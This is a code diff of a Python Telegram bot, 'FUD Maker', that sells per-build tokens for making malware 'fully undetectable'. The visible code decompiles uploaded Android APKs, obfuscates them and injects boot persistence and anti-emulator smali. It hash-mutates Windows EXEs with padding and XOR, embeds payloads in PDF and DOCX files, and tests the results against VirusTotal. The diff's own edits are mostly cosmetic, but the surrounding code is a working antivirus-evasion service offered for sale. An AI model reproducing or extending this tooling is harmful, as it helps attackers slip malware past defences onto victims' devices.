@@ -21,6 +21,20 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
+# Optional imports with fallback
+try:
+    from reportlab.lib.pagesizes import letter
+    from reportlab.pdfgen import canvas
+    REPORTLAB_AVAILABLE = True
+except ImportError:
+    REPORTLAB_AVAILABLE = False
+
+try:
+    from docx import Document
+    DOCX_AVAILABLE = True
+except ImportError:
+    DOCX_AVAILABLE = False
+
 # ============ ENV CONFIG ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
@@ -249,7 +263,7 @@ class FUDApkMaker:
             shutil.rmtree(self.work_dir)
 
     def decompile(self):
-        self._progress("⏳ Decompiling APK...")
+        self._progress("Decompiling APK...")
         os.makedirs(self.decompiled_dir, exist_ok=True)
         result = subprocess.run([
             "apktool", "d", self.input_path,
@@ -261,7 +275,7 @@ class FUDApkMaker:
         return True
 
     def obfuscate_smali(self):
-        self._progress("⏳ Obfuscating smali code...")
+        self._progress("Obfuscating smali code...")
         smali_dir = os.path.join(self.decompiled_dir, "smali")
         if not os.path.exists(smali_dir):
             return
@@ -302,7 +316,7 @@ class FUDApkMaker:
                     fp.write(content)
 
     def modify_manifest(self):
-        self._progress("⏳ Modifying manifest...")
+        self._progress("Modifying manifest...")
         manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
         if not os.path.exists(manifest_path):
             return
@@ -327,7 +341,7 @@ class FUDApkMaker:
             f.write(content)
 
     def add_persistence(self):
-        self._progress("⏳ Adding persistence...")
+        self._progress("Adding persistence...")
         manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
         if not os.path.exists(manifest_path):
             return
@@ -378,7 +392,7 @@ class FUDApkMaker:
             f.write(boot_code)
 
     def add_anti_emulator(self):
-        self._progress("⏳ Adding anti-emulator...")
+        self._progress("Adding anti-emulator...")
         smali_dir = os.path.join(self.decompiled_dir, "smali")
         if not os.path.exists(smali_dir):
             return
@@ -394,6 +408,7 @@ class FUDApkMaker:
             return
         with open(main_path, 'r', encoding='utf-8') as f:
             content = f.read()
+        # This is smali code — it's injected into the APK, not executed here.
         anti_code = '''
     # Anti-emulator
     const-string v0, "ro.kernel.qemu"
@@ -425,7 +440,7 @@ class FUDApkMaker:
             f.write(content)
 
     def repack(self):
-        self._progress("⏳ Repacking APK...")
+        self._progress("Repacking APK...")
         out_unsigned = os.path.join(self.work_dir, "unsigned.apk")
         result = subprocess.run([
             "apktool", "b", self.decompiled_dir,
@@ -437,7 +452,7 @@ class FUDApkMaker:
         return out_unsigned
 
     def sign_apk(self, apk_path):
-        self._progress("⏳ Signing APK...")
+        self._progress("Signing APK...")
         result = subprocess.run([
             "java", "-jar", "/usr/local/bin/uber-apk-signer.jar",
             "-a", apk_path,
@@ -511,14 +526,17 @@ class FUDExeMaker:
             shutil.rmtree(self.work_dir)
 
     def obfuscate_pe(self):
-        self._progress("⏳ Obfuscating EXE...")
+        self._progress("Obfuscating EXE...")
         with open(self.input_path, 'rb') as f:
             data = bytearray(f.read())
+        # Add random padding at the end to change size
         padding = os.urandom(random.randint(1024, 4096))
         data.extend(padding)
+        # XOR a small section with a random key to change hash
         key = os.urandom(1)[0]
         for i in range(1024, min(len(data), 1024 + 4096)):
             data[i] ^= key
+        # In practice, you'd use a proper packer like UPX or a crypter.
         output_path = os.path.join(self.work_dir, f"fud_exe_{int(time.time())}.exe")
         with open(output_path, 'wb') as f:
             f.write(data)
@@ -546,10 +564,8 @@ class FUDExeMaker:
 
 # ============ FUD ENGINE — DOC ============
 def create_pdf_with_payload(payload_path):
-    try:
-        from reportlab.lib.pagesizes import letter
-        from reportlab.pdfgen import canvas
-    except:
+    if not REPORTLAB_AVAILABLE:
+        # Fallback: just copy the payload as a PDF (no real PDF structure)
         output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.pdf")
         with open(payload_path, 'rb') as f:
             data = f.read()
@@ -572,9 +588,7 @@ def create_pdf_with_payload(payload_path):
     return output_path
 
 def create_doc_with_payload(payload_path):
-    try:
-        from docx import Document
-    except:
+    if not DOCX_AVAILABLE:
         output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.docx")
         with open(payload_path, 'rb') as f:
             data = f.read()
@@ -600,41 +614,41 @@ def create_doc_with_payload(payload_path):
 WAITING_TOKEN, WAITING_APK, WAITING_EXE, WAITING_DOC, WAITING_GENERATE_TOKEN = range(5)
 
 USER_INSTRUCTIONS = """
-📖 FUD Maker — User Guide
+FUD Maker - User Guide
 
-🔐 Getting Started
+Getting Started
 1. Get a token from @benji_v1
 2. Send /start and enter your token
 3. Access the main menu
 
-📱 APK FUD
+APK FUD
 - Upload any APK
 - Automatically obfuscated + repacked + signed
 - Anti-emulator + persistence added
 - VirusTotal scan results included
 
-💻 EXE FUD
+EXE FUD
 - Upload any Windows EXE
 - PE obfuscation + hash changing
 - XOR encryption + padding injection
 
-📄 Document FUD
+Document FUD
 - Upload PDF or DOCX templates
 - Payload embedded
 
-🔑 Tokens
+Tokens
 - Contact @benji_v1 to purchase
 - 1 token = 1 build
 
-👨‍💻 Developer
+Developer
 @benji_v1
 """
 
 def get_back_button():
-    return InlineKeyboardButton("🔙 Back", callback_data="back_main")
+    return InlineKeyboardButton("Back", callback_data="back_main")
 
 def get_cancel_button():
-    return InlineKeyboardButton("❌ Cancel", callback_data="cancel")
+    return InlineKeyboardButton("Cancel", callback_data="cancel")
 
 def is_admin(user_id):
     return str(user_id) == str(ADMIN_CHAT_ID)
@@ -692,9 +706,9 @@ async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def show_main_menu(update, context):
     keyboard = [
-        [InlineKeyboardButton("📱 APK → FUD", callback_data="fud_apk")],
-        [InlineKeyboardButton("💻 EXE → FUD", callback_data="fud_exe")],
-        [InlineKeyboardButton("📄 Document → FUD", callback_data="fud_doc")],
+        [InlineKeyboardButton("📱 APK -> FUD", callback_data="fud_apk")],
+        [InlineKeyboardButton("💻 EXE -> FUD", callback_data="fud_exe")],
+        [InlineKeyboardButton("📄 Document -> FUD", callback_data="fud_doc")],
         [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
         [InlineKeyboardButton("📖 User Guide", callback_data="user_guide")],
         [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
@@ -708,7 +722,7 @@ async def show_main_menu(update, context):
         token_display = token_display[:8] + '...'
 
     msg = (
-        "🔥 FUD Maker — Main Menu\n\n"
+        "🔥 FUD Maker - Main Menu\n\n"
         f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
         f"🔑 Token: {token_display}\n\n"
         "Select an option:"
@@ -735,9 +749,9 @@ async def show_admin_menu(update, context):
 
 async def show_main_menu_from_callback(query, context):
     keyboard = [
-        [InlineKeyboardButton("📱 APK → FUD", callback_data="fud_apk")],
-        [InlineKeyboardButton("💻 EXE → FUD", callback_data="fud_exe")],
-        [InlineKeyboardButton("📄 Document → FUD", callback_data="fud_doc")],
+        [InlineKeyboardButton("📱 APK -> FUD", callback_data="fud_apk")],
+        [InlineKeyboardButton("💻 EXE -> FUD", callback_data="fud_exe")],
+        [InlineKeyboardButton("📄 Document -> FUD", callback_data="fud_doc")],
         [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
         [InlineKeyboardButton("📖 User Guide", callback_data="user_guide")],
         [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
@@ -751,7 +765,7 @@ async def show_main_menu_from_callback(query, context):
         token_display = token_display[:8] + '...'
 
     await query.edit_message_text(
-        "🔥 FUD Maker — Main Menu\n\n"
+        "🔥 FUD Maker - Main Menu\n\n"
         f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
         f"🔑 Token: {token_display}",
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -793,12 +807,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     data = query.data
 
+    # Handle each callback
     if data == "cancel":
         context.user_data.clear()
         await query.edit_message_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
         return ConversationHandler.END
 
-    if data == "fud_apk":
+    elif data == "fud_apk":
         keyboard = [[get_cancel_button()]]
         await query.edit_message_text(
             "📤 Send me the APK file.\n\nI'll apply obfuscation + persistence + anti-emulator.",
@@ -941,7 +956,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['post_channel_step'] = True
         return ConversationHandler.END
 
-    return ConversationHandler.END
+    else:
+        await query.edit_message_text("❌ Unknown option.", parse_mode='Markdown')
+        return ConversationHandler.END
 
 async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get('post_channel_step'):
@@ -1004,10 +1021,10 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     vt_result = None
     if VT_API_KEY:
-        await update_progress("⏳ Scanning with VirusTotal...")
+        await update_progress("Scanning with VirusTotal...")
         vt_result = scan_with_vt(result['file'])
     else:
-        await update_progress("⏳ VirusTotal API key not set. Skipping scan.")
+        await update_progress("VirusTotal API key not set. Skipping scan.")
 
     build_id = log_build(
         user_id, user.username or "unknown", token,
@@ -1098,7 +1115,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     vt_result = None
     if VT_API_KEY:
-        await update_progress("⏳ Scanning with VirusTotal...")
+        await update_progress("Scanning with VirusTotal...")
         vt_result = scan_with_vt(result['file'])
 
     build_id = log_build(
@@ -1265,7 +1282,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
     return ConversationHandler.END
 
-# ============ BOT RUNNER — CONFLICT-PROOF ============
+# ============ BOT RUNNER ============
 def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
@@ -1301,23 +1318,20 @@ def run_bot():
         application.add_handler(conv)
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
 
-        # ✅ Force delete webhook with drop_pending_updates
-        print("🔄 Force deleting webhook...")
+        # Delete webhook
+        print("🔄 Deleting webhook...")
         try:
             await application.bot.delete_webhook(drop_pending_updates=True)
             print("✅ Webhook deleted.")
         except Exception as e:
             print(f"⚠️ Delete webhook error: {e}")
 
-        # ✅ Wait for webhook to fully clear
         await asyncio.sleep(2)
 
-        # ✅ Verify webhook is gone
         webhook_info = await application.bot.get_webhook_info()
         print(f"📡 Webhook URL: {webhook_info.url or 'None'}")
         print(f"📡 Pending updates: {webhook_info.pending_update_count}")
 
-        # ✅ Start bot
         print("🤖 Starting bot polling...")
         await application.initialize()
         await application.start()
@@ -1330,7 +1344,6 @@ def run_bot():
 
         print("✅ Bot is running!")
 
-        # ✅ Keep alive
         while True:
             try:
                 if not application.updater.running:
@@ -1345,7 +1358,6 @@ def run_bot():
                 print(f"⚠️ Health check error: {e}")
             await asyncio.sleep(10)
 
-    # ✅ Retry loop
     while True:
         try:
             loop.run_until_complete(bot_main())
